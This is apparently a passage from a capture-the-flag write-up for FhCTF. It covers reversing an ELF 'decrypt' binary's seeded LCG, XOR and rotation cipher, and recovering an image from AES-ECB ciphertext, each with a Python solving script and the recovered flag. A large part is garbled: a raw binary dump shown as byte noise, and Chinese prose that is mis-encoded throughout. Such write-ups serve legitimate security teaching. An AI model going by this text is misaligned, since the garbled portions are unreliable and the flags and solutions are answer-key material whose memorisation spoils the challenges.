<span class="number">8</span>      <span class="number">0</span>       <span class="number">0</span>                    h      h      h      D       D              Så»d   <span class="number">8</span>      <span class="number">8</span>      <span class="number">8</span>      <span class="number">0</span>       <span class="number">0</span>              På»d   d       d       d       <span class="string">\</span>       <span class="string">\</span>              Qå»d                                                  Rå»d   X-      X=      X=      ?      ?             /lib64/ld-linux-x86-<span class="number">64.so</span>.<span class="number">2</span>               GNU   ?          Â€ ?                   GNU eè«²p<span class="number">6</span>Nî¸)Lî¥ï¼Ÿî†”         GNU                                 ?!            èƒ—å§²r?%mCæ…é©§?C                        &#123;                     d                      ?                     ?                      ?                     ?                      d                     u                     ?                     ?                      ^                     F                                                                    ,                       ?                     ?  <span class="string">&quot;                   ?     `A            ?     Â€B              &quot;</span>  ?      ?       T    @@             __gmon_start__ _ITM_deregisterTMCloneTable _ITM_registerTMCloneTable _ZSt17__istream_extractRSiPcl _ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_ _ZSt3cin _ZNSolsEPFRSoS_E _ZSt4cerr _ZSt21ios_base_library_initv _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc _ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_ _ZSt4cout fgets __stack_chk_fail fopen strlen __isoc23_strtol __libc_start_main __cxa_finalize fclose fputc libstdc++.so.<span class="number">6</span> libc.so.<span class="number">6</span> GLIBCXX_3.<span class="number">4.29</span> GLIBCXX_3.<span class="number">4.32</span> GLIBCXX_3.<span class="number">4</span> GLIBC_2.<span class="number">38</span> GLIBC_2.<span class="number">4</span> GLIBC_2.<span class="number">34</span> GLIBC_2.<span class="number">2.5</span>                                ?     @   y?    ?     B?   ?     t)?   ?        ?         ??        ii</span><br><span class="line">        ??        ui	   <span class="comment">#      X=             `      `=                    @             @      ?                    ?                    ?                    ?         </span></span><br><span class="line">           ?                    ?                    @@                    `A                    Â€B                    Â€?                     ?                     ?                     ?                     ?                      ?                     ?          	           ?                     ?                     ?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ?î€ˆï¼H??  Hï†Štï£¸ç²€ï”?     ï£¸<span class="number">5</span>J/  ï£¸%L/  @ ?î€¨    æ®ªï£¸ï£¸ï£¸fî“œî€¨   æ©ï£¸ï£¸ï£¸fî“œî€¨   æ¨²ï£¸ï£¸ï£¸fî“œî€¨   æ–¢ï£¸ï£¸ï£¸fî“œî€¨   æ†¸ï£¸ï£¸ï£¸fî“œî€¨   ?ï£¸ï£¸ï£¸fî“œî€¨   ?ï£¸ï£¸ï£¸fî“œî€¨    å»¨ï£¸ï£¸ï£¸fî“œî€¨   å¶µï£¸ï£¸ï£¸fî“œî€¨	   å¬™ï£¸ï£¸ï£¸fî“œ?%?  fD  ??%?  fD  ??%?  fD  ??%?  fD  ??%~.  fD  ??%v.  fD  ??%n.  fD  ??%f.  fD  ??%^.  fD  ??%V.  fD  ??%N.  fD  ??æªŒï^Hï Hï´ç™šTE1?äº??  ï£¸;.  ç€.?     H?Y.  H?R.  H9é»‚H?.  Hï†Št	ï£¸?Â€    ?Â€    H?).  H?<span class="string">&quot;.  H)î‰¼ï®Hé”?HéœHéŸ†æ¯¤tH??  Hï†Štï£¸è¶’D  ?Â€    ??=e1   u+UH??   Hï£tH??  ??ï£¸é‹„ï£¸ï£¸ï£¸?=1  ]? ?Â€    ?î‚‡wï£¸ï£¸ï£¸?î€•Hï£Hïè½£ï“Ÿ? ié´¦Nè‰·90  %ï£¸ï£¸ï£¸ï€Hï“Ÿ?Hï“Ÿ? ]é¤î€•Hï£Hïé§E?    ?ï“¯?é‡“?)?ç¦§ï“Ÿ?? å£?Eî…‚î¿·?Hï“Ÿ?? ïƒ­u?Eî…—é¤î€•Hï£ï¶ï•?E?è²¸?E?è¼¾???è²¸î†   +E?è¼¾??ç¤‘é¤î€•Hï£Hï¼ Hïè¼¤ï“Ÿè¼¤ï…éœ‚?ï£¸Hï¥é½´Hï“Ÿè½£ï˜¤ï£¸Hï“Ÿè¼¤é™Š  Hï€Ÿ?Hï€¯? t,Hï“Ÿè½£ï˜¤ï£¸Hï“Ÿè¼¤?? &lt;</span></span><br><span class="line"><span class="string">tå¦²ï“Ÿè½£ï˜¤ï£¸Hï“Ÿè¼¤?? &lt;</span></span><br><span class="line"><span class="string">t?å?î€•Hï£Hî½‚P  dH?%(   Hï¥?éš¨?[  Hï„H??  Hï…??ï£¸H?è¹¥ï£¸ï£¸Hï„H??  Hï…å™®  H?:  Hï„H?[,  Hï…??ï£¸H?è¹§ï£¸ï£¸Hï„H?b-  Hï…é§‰  H?è¹¥ï£¸ï£¸H?  Hï”Hï…??ï£¸H?ç°ï£¸ï£¸Hïç°ï£¸ï£¸ u5H??  Hï„H??.  Hï…é–«?ï£¸H??  Hï”Hï…éŸ?ï£¸?   å¬  H?ç°ï£¸ï£¸H?åª»ï£¸ï£¸?   Hï…é§—?ï£¸Hï†Šîœïƒ­tH?ç°ï£¸ï£¸Hï…éŠ¶?ï£¸?   ?  H?åª»ï£¸ï£¸Hï…é‹ƒ?ï£¸H?ç°ï£¸ï£¸H?è†£ï£¸ï£¸?   Hï…??ï£¸Hï†Šîœïƒ­t ?è†£ï£¸ï£¸ H?è†£ï£¸ï£¸Hï…??ï£¸H?ç°ï£¸ï£¸Hï…??ï£¸H?è¹§ï£¸ï£¸H?9  Hï”Hï…??ï£¸H?ï¡‡ï£¸ï£¸Hïï¡‡ï£¸ï£¸ u5H?  Hï„H?I-  Hï…éŠ?ï£¸H??  Hï”Hï…é¤ˆ?ï£¸?   å¶§  H?è†£ï£¸ï£¸Hï…??ï£¸?æ¸¾ï£¸ï£¸f?æ¸®ï£¸ï£¸  ?è»·ï£¸ï£¸ H?åª»ï£¸ï£¸Hï…é¯?ï£¸H?å”…ï£¸ï£¸H?è»¾ï£¸ï£¸    æ¿   H?åª»ï£¸ï£¸H?è»¾ï£¸ï£¸H?? ?æ¸®ï£¸ï£¸H?è»¾ï£¸ï£¸Hï?åª»ï£¸ï£¸?ç¼¿ï£¸ï£¸H?æ¸®ï£¸ï£¸?   ?    Hï…é‹“?ï£¸?æ¬²ï£¸ï£¸?æ¬²ï£¸ï£¸?è»ï£¸ï£¸?æ¬²ï£¸ï£¸?   ï…é§?ï£¸?æ¬²ï£¸ï£¸H?æ¸¾ï£¸ï£¸Hï…??ï£¸ï¿ïˆ?Â€Â€Â€Hç´”HéŒ˜ éŒ˜ ï€é‚)???ï…½?ï£¸?å£ºï£¸ï£¸0ï…»?ï£¸?è»ï£¸ï£¸?æ¸¾ï£¸ï£¸?ï…¾?ï£¸?æ¬²ï£¸ï£¸H?ï¡‡ï£¸ï£¸Hï”ï…éŸ?ï£¸H?è»¾ï£¸ï£¸H?è»¾ï£¸ï£¸H;ï†š?ï£¸î¿±?ï£¸H?ï¡‡ï£¸ï£¸Hï…è¼˜?ï£¸?    Hï“¯é·£H+%(   té°?ï£¸å?î€•Hï£Hï¼ Hïè¼¤ï•è©¡?ï£¸ï£¸ï£¸ï£¸ï£¸ï£¸Hï¥è½£ï“¯è½£ï“§è©¡ï“Ÿè¼¤ïŒHï…é„«?ï£¸Hï“Ÿé§“?   ?î€ˆï¼Hï”?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 Input Filename:  Output Filename:  r Error opening input file. w Error opening output file.  ;X   </span></span><br><span class="line"><span class="string">   æ½˜ï£¸ï£¸?   l?ï£¸?   |?ï£¸?   ?ï£¸t   ?ï£¸?   7?ï£¸  |?ï£¸$  æ¢ƒï£¸ï£¸D   ?ï£¸d  n?ï£¸?         zR x ?        îº©ï£¸ï£¸&amp;    D     $   4   (?ï£¸?    FJwÂ€ ?9*3$&quot;</span>       <span class="string">\</span>   å †ï£¸ï£¸              t   å‰ï£¸ï£¸?              ?   ?ï£¸<span class="number">2</span>    E?C</span><br><span class="line">i       ?   +?ï£¸E    E?C</span><br><span class="line">|       ?   P?ï£¸<span class="number">5</span>    E?C</span><br><span class="line">l       ?   e?ï£¸o    E?C</span><br><span class="line">f        æ¸¤ï£¸ï£¸N   E?C</span><br><span class="line">E     ,  ç¢ ï£¸ï£¸?    E?C</span><br><span class="line">v                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    `                    ?             ?                    </span><br><span class="line">                    X=                           `=                    è˜¥ï£¸o    ?             ?             ?      </span><br><span class="line">       /                                          h?             ?                             </span><br><span class="line">              ?                    	                            ?ï£¸o          ?ï£¸o    X      ï£¸ï£¸ï£¸o           ?ï£¸o    (      ?ï£¸o                                                                                           h=                      <span class="number">0</span>      @      P      `      p      Â€      ?      ?      ?      ?                                                              @      GCC: (Ubuntu <span class="number">13.3</span>.<span class="number">0</span>-<span class="number">6ubuntu</span>2~<span class="number">24.04</span>) <span class="number">13.3</span>.<span class="number">0</span>                                  ?                	     ?                  ?                     ?                    ?              <span class="number">3</span>                    I     î‘             U     `=              |     `              ?     X=              ?    ?                ?     `              ?     a                  b                  ?                L    <span class="string">&quot;                   ?                Z     d               m    h=              v    h?              ?  &quot;</span>  ?      ?       ?    @              ?      @              ?                   ?  <span class="string">&quot;                   ?                         ?      N                           X   @              e          o       y                                      ?    Â€      &amp;       ?    ?      5       ?                     ?                                          &quot;</span>    i      <span class="number">2</span>       <span class="number">3</span>                     N                  T   @              `                     r                     ?    @@            ?    ?      E       ?     @              ?    î¤¶              ?    @@              ?                     ?                     </span><br><span class="line">                     <span class="number">7</span>                      S    `A            h                      w                      ?    Â€B            ?                      Scrt1.o __abi_tag crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.<span class="number">0</span> __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry decrypt.cpp _ZNSt8__detail30__integer_to_chars_is_unsignedIjEE _ZNSt8__detail30__integer_to_chars_is_unsignedImEE _ZNSt8__detail30__integer_to_chars_is_unsignedIyEE __FRAME_END__ __GNU_EH_FRAME_HDR _DYNAMIC _GLOBAL_OFFSET_TABLE_ _ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_ _edata _IO_stdin_used __cxa_finalize@GLIBC_2.<span class="number">2.5</span> strlen@GLIBC_2.<span class="number">2.5</span> main _ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GLIBCXX_3.<span class="number">4</span> __dso_handle _Z13removeNewlinePc _fini __libc_start_main@GLIBC_2.<span class="number">34</span> _Z11rotateRighthi _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@GLIBCXX_3.<span class="number">4</span> fclose@GLIBC_2.<span class="number">2.5</span> _ZNSolsEPFRSoS_E@GLIBCXX_3.<span class="number">4</span> _Z10getNextKeyRj __stack_chk_fail@GLIBC_2.<span class="number">4</span> _init __TMC_END__ fopen@GLIBC_2.<span class="number">2.5</span> fputc@GLIBC_2.<span class="number">2.5</span> _ZSt4cout@GLIBCXX_3.<span class="number">4</span> _Z12generateSeedPKc __data_start _end __bss_start _ZSt21ios_base_library_initv@GLIBCXX_3.<span class="number">4.32</span> fgets@GLIBC_2.<span class="number">2.5</span> _ZSt17__istream_extractRSiPcl@GLIBCXX_3.<span class="number">4.29</span> _ITM_deregisterTMCloneTable _ZSt3cin@GLIBCXX_3.<span class="number">4</span> __gmon_start__ _ITM_registerTMCloneTable _ZSt4cerr@GLIBCXX_3.<span class="number">4</span> __isoc23_strtol@GLIBC_2.<span class="number">38</span>  .symtab .strtab .shstrtab .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .plt.sec .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .data .bss .comment                                                                                                                            <span class="comment">#              8      8      0                              6              h      h      $                              I              ?      ?                                     W   ?ï£¸o       ?      ?      8                             a             ?      ?                                 i             ?      ?      /                             q   ï£¸ï£¸ï£¸o       (      (      ,                            ~   ?ï£¸o       X      X      ?                             ?             ?      ?                                  ?      B       </span></span><br><span class="line">      </span><br><span class="line">      ?                           ?                                                         ?                           ?                             ?             ?      ?                                   ?             ?      ?      ?                             ?             Â€      Â€      ?                             ?                         </span><br><span class="line">                              ?                             c                              ?             d       d       <span class="string">\</span>                              ?             ?      ?      L                             ?             X=      X-                                   ?             `=      `-                                   ?             h=      h-                                   ?             h?      h/      ?                                          @       <span class="number">0</span>                                                @@      <span class="number">0</span>      X              @                    <span class="number">0</span>               <span class="number">0</span>      +                                                   @<span class="number">0</span>      p     </span><br></pre></td></tr></table></figure>
<p>æä¾›ELFäºŒé€²ä½æª”decryptèˆ‡åŠ å¯†æª”æ¡ˆencrypted_flagï¼Œéœ€é€†å‘åˆ†æè§£å¯†é‚è¼¯ä¸¦å¯¦ä½œPythonè…³æœ¬å–å¾—flag ã€‚é€éstringsèˆ‡å‡½æ•¸ç¬¦è™Ÿè­˜åˆ¥é—œéµæ¼”ç®—æ³•ï¼ŒåŒ…æ‹¬generateSeedã€getNextKeyã€rotateRightç­‰</p>
<ul>
<li>éœæ…‹åˆ†æ</li>
</ul>
<p>åŸ·è¡Œstrings decrypté¡¯ç¤ºç¨‹å¼è®€å–input/outputæª”æ¡ˆï¼Œä½¿ç”¨fopenã€fgetsã€fputcï¼Œä¸¦ä¾è³´libstdc++èˆ‡libcç¬¦è™Ÿå¦‚__stack_chk_failã€__libc_start_mainã€‚ç¬¦è™Ÿè¡¨æ­ç¤ºæ ¸å¿ƒå‡½æ•¸ï¼š</p>
<ul>
<li>generateSeedï¼šå¾passwordç”Ÿæˆåˆå§‹seedï¼Œä½¿ç”¨seed = seed * 31 + chçš„hashæ–¹å¼ï¼Œæ¨¡0xFFFFFFFFã€‚</li>
<li>getNextKeyï¼šLCGå½éš¨æ©Ÿç”¢ç”Ÿå™¨ï¼Œå…¬å¼(seed * 0x41C64E6D + 0x3039) &amp; 0x7FFFFFFFï¼Œkey = seed % 255ã€‚</li>
<li>rotateRightï¼šå³æ—‹ä½ç§»ï¼Œrotate_right(byte, 3)ã€‚</li>
<li>mainï¼šè®€å–hexå­—ä¸²ï¼Œå°æ¯byteåŸ·è¡Œæ—‹è½‰â†’æ›´æ–°seedâ†’XOR keyâ†’seed += åŸbyteã€‚</li>
</ul>
<p>ELFç‰‡æ®µé¡¯ç¤ºhexè³‡æ–™&quot;2781ACE7A1534E1231F7B84AD05565FEFB484A86E6ECD5C76686276A57658F79686098C6A5F0593D395543ABFF118410B2F02CF61FA5&quot;èˆ‡passwordæç¤º&quot;I_just_afraid_someday_i_will_forget_the_password&quot;ã€‚</p>
<ul>
<li>é‚è¼¯é‚„åŸ</li>
</ul>
<p>è§£å¯†æµç¨‹ç‚ºæ¯byteç¨ç«‹è™•ç†ï¼š</p>
<ol>
<li>hexè§£æç‚ºbyte bã€‚</li>
<li>b_rot = rotate_right(b, 3)ï¼Œå³(b &gt;&gt; 3) | (b &lt;&lt; 5) &amp; 0xFFã€‚</li>
<li>seed = getNextKey(seed)ã€‚</li>
<li>key = seed % 255ã€‚</li>
<li>plaintext_byte = b_rot ^ keyã€‚</li>
<li>seed = (seed + b) &amp; 0xFFFFFFFFï¼ˆæ³¨æ„åŠ åŸå§‹bï¼Œéæ—‹è½‰å¾Œï¼‰ã€‚</li>
</ol>
<p>æ­¤èˆ‡å¸¸è¦‹æµå¯†ç¢¼ä¸åŒï¼Œseedæ›´æ–°ä¾è³´åŸå§‹å¯†æ–‡ï¼Œå½¢æˆä¾è³´éˆ</p>
<ul>
<li>è§£å¯†è…³æœ¬</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">hexline = (<span class="string">&quot;2781ACE7A1534E1231F7B84AD05565FEFB484A86E6ECD5C76686276A57658F7&quot;</span></span><br><span class="line">           <span class="string">&quot;9686098C6A5F0593D395543ABFF118410B2F02CF61FA5&quot;</span>)</span><br><span class="line">password = <span class="string">&quot;I_just_afraid_someday_i_will_forget_the_password&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_seed</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    seed = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s.encode():</span><br><span class="line">        seed = (seed * <span class="number">31</span> + ch) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_next_key</span>(<span class="params">seed: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> (seed * <span class="number">0x41C64E6D</span> + <span class="number">0x3039</span>) &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotate_right</span>(<span class="params">byte: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> ((byte &gt;&gt; n) | ((byte &lt;&lt; (<span class="number">8</span> - n)) &amp; <span class="number">0xFF</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">seed = generate_seed(password)</span><br><span class="line">out = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hexline), <span class="number">2</span>):</span><br><span class="line">    b = <span class="built_in">int</span>(hexline[i:i+<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">    b_rot = rotate_right(b, <span class="number">3</span>)</span><br><span class="line">    seed = get_next_key(seed)</span><br><span class="line">    key = seed % <span class="number">255</span></span><br><span class="line">    out.append(b_rot ^ key)</span><br><span class="line">    seed = (seed + b) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(out.decode()) </span><br></pre></td></tr></table></figure>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;Why_not_use_std::<span class="built_in">string</span>_instead_of_char_arrays?&#125;</span><br></pre></td></tr></table></figure>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
<h3 id="å®‰å…¨çš„åŠ å¯†"><a class="markdownIt-Anchor" href="#å®‰å…¨çš„åŠ å¯†"></a> å®‰å…¨çš„åŠ å¯†</h3>
<p>é€™é¡Œå±•ç¤ºäº†ç‚ºä»€éº¼ ECB åŠ å¯†æ¨¡å¼ä¸é©åˆç”¨æ–¼åœ–åƒè³‡æ–™ã€‚</p>
<ul>
<li>åŠ å¯†æ©Ÿåˆ¶åˆ†æ<br />
<img src="/images/FhCTF/29.webp" alt="image" /></li>
</ul>
<p>é¡Œç›®ä½¿ç”¨è…³æœ¬å°‡ flag è½‰æ›ç‚º BMP åœ–æª”å¾Œï¼Œå†é€é AES-256-ECB åŠ å¯†ã€‚ç‰¹åˆ¥çš„æ˜¯ï¼ŒåŠ å¯†é‡‘é‘°ç›´æ¥å¾ flag çš„åå…­é€²ä½è¡¨ç¤ºå–å¾—ã€‚ç”±æ–¼ OpenSSL çš„ <code>enc</code> æŒ‡ä»¤åœ¨é‡‘é‘°é•·åº¦ä¸è¶³æ™‚æœƒè‡ªå‹•å¡«å……é›¶ä½å…ƒçµ„è‡³ 32 bytesï¼Œå¯¦éš›åŠ å¯†éç¨‹ä¸­çš„é‡‘é‘°æ˜¯å¯é æ¸¬çš„ã€‚</p>
<ul>
<li>æ”»æ“Šå‘é‡</li>
</ul>
<p>ECB æœ€è‡´å‘½çš„å¼±é»åœ¨æ–¼ç›¸åŒæ˜æ–‡å€å¡Šç¸½æ˜¯ç”¢ç”Ÿç›¸åŒå¯†æ–‡å€å¡Šã€‚ç•¶åŠ å¯†å°è±¡æ˜¯çµæ§‹åŒ–è³‡æ–™ï¼ˆå¦‚åœ–åƒï¼‰æ™‚ï¼Œé€™å€‹ç‰¹æ€§æœƒç›´æ¥æš´éœ²è³‡æ–™çš„ç©ºé–“åˆ†å¸ƒæ¨¡å¼ã€‚</p>
<ul>
<li>è§£å¯†æ­¥é©Ÿ</li>
</ul>
<p>ç”±æ–¼åœ–æª”æ ¼å¼ç‚º 1000Ã—100 åƒç´ çš„ 32-bit BMPï¼Œæ¯å€‹åƒç´ ä½” 4 bytesï¼Œç¸½å…± 400,000 bytesã€‚AES ä»¥ 16-byte ç‚ºå–®ä½åˆ†å¡ŠåŠ å¯†ï¼Œå°æ‡‰åˆ°åœ–åƒä¸­å°±æ˜¯æ¯ 4 å€‹åƒç´ ç‚ºä¸€çµ„ã€‚</p>
<p>é€éä»¥ä¸‹æ­¥é©Ÿé‡å»ºåœ–åƒï¼š</p>
<ul>
<li>è®€å–åŠ å¯†æª”æ¡ˆä¸¦æŒ‰ 16-byte åˆ‡åˆ†æˆå€å¡Š</li>
<li>è·³é BMP æ¨™é ­ä½”ç”¨çš„å‰ 138 bytesï¼ˆç´„ 9 å€‹å€å¡Šï¼‰</li>
<li>å°‡æ¯å€‹åŠ å¯†å€å¡Šè¦–ç‚ºä¸€å€‹é¡è‰²å–®å…ƒ</li>
<li>é‡æ–°æ’åˆ—æˆ 250Ã—100 çš„å€å¡Šé™£åˆ—ï¼ˆ1000Ã·4=250ï¼‰</li>
<li>ç‚ºä¸åŒçš„å¯†æ–‡å€å¡ŠæŒ‡æ´¾ä¸åŒé¡è‰²é€²è¡Œè¦–è¦ºåŒ–</li>
</ul>
<p>ç”±æ–¼æ–‡å­—å€åŸŸå’ŒèƒŒæ™¯å€åŸŸçš„åƒç´ å€¼ä¸åŒï¼ŒåŠ å¯†å¾Œæœƒç”¢ç”Ÿæˆªç„¶ä¸åŒçš„å¯†æ–‡å€å¡Šã€‚é€éé¡è‰²æ˜ å°„ï¼Œæ–‡å­—çš„è¼ªå»“æœƒæ¸…æ™°å‘ˆç¾ï¼Œç›´æ¥è®€å–å³å¯å¾—åˆ° flagã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¨­å®š</span></span><br><span class="line">ENC_FILE = <span class="string">&quot;flag.enc&quot;</span></span><br><span class="line">OUTPUT_DIR = <span class="string">&quot;results&quot;</span></span><br><span class="line">MIN_WIDTH = <span class="number">200</span>  <span class="comment"># æ ¹æ“šç¶“é©—æˆ–æ¸¬è©¦èª¿æ•´ç¯„åœ</span></span><br><span class="line">MAX_WIDTH = <span class="number">300</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># 1. è®€å–åŠ å¯†æª”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(ENC_FILE, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. åˆ‡åˆ†å€å¡Š (AES Block Size = 16 bytes)</span></span><br><span class="line">    block_size = <span class="number">16</span></span><br><span class="line">    blocks = [content[i:i+block_size] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content), block_size)]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. æ‰¾å‡ºèƒŒæ™¯ (é »ç‡æœ€é«˜çš„å€å¡Š)</span></span><br><span class="line">    counts = Counter(blocks)</span><br><span class="line">    most_common_block = counts.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. è½‰æ›ç‚º 0/1 Map (1=èƒŒæ™¯, 0=æ–‡å­—)</span></span><br><span class="line">    pixel_map = [<span class="number">1</span> <span class="keyword">if</span> b == most_common_block <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> b <span class="keyword">in</span> blocks]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(OUTPUT_DIR):</span><br><span class="line">        os.makedirs(OUTPUT_DIR)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5. æš´åŠ›æšèˆ‰å¯¬åº¦ä¸¦ç¹ªåœ–</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Generating images from width <span class="subst">&#123;MIN_WIDTH&#125;</span> to <span class="subst">&#123;MAX_WIDTH&#125;</span>...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> width <span class="keyword">in</span> <span class="built_in">range</span>(MIN_WIDTH, MAX_WIDTH + <span class="number">1</span>):</span><br><span class="line">        height = <span class="built_in">len</span>(pixel_map) // width + <span class="number">1</span></span><br><span class="line">        img = Image.new(<span class="string">&#x27;1&#x27;</span>, (width, height), <span class="number">1</span>)</span><br><span class="line">        pixels = img.load()</span><br><span class="line">        </span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">                    <span class="keyword">if</span> idx &lt; <span class="built_in">len</span>(pixel_map):</span><br><span class="line">                        <span class="comment"># å¦‚æœä¸æ˜¯èƒŒæ™¯(0)ï¼Œå°±ç•«é»‘é»</span></span><br><span class="line">                        <span class="keyword">if</span> pixel_map[idx] == <span class="number">0</span>:</span><br><span class="line">                            pixels[x, y] = <span class="number">0</span> </span><br><span class="line">                        idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            </span><br><span class="line">        img.save(<span class="string">f&quot;<span class="subst">&#123;OUTPUT_DIR&#125;</span>/width_<span class="subst">&#123;width&#125;</span>.webp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/images/FhCTF/30.webp" alt="image" /></p>
<p>æˆ‘å€‘å¯ä»¥çœ‹åˆ°æ˜¯åéä¾†çš„<code>FhCTF{3C13_m0d3_1s_z0_S3cur17y_}</code><br />
<img src="/images/FhCTF/31.webp" alt="image" /></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FhCTF</span>&#123;<span class="number">3</span>C13_m0d3_1s_z0_S3cur17y_&#125;</span><br></pre></td></tr></table></figure>
<h3 id="encode-by-py"><a class="markdownIt-Anchor" href="#encode-by-py"></a> Encode By Py ğŸ˜˜</h3>
<p><img src="/images/FhCTF/32.webp" alt="image" /></p>
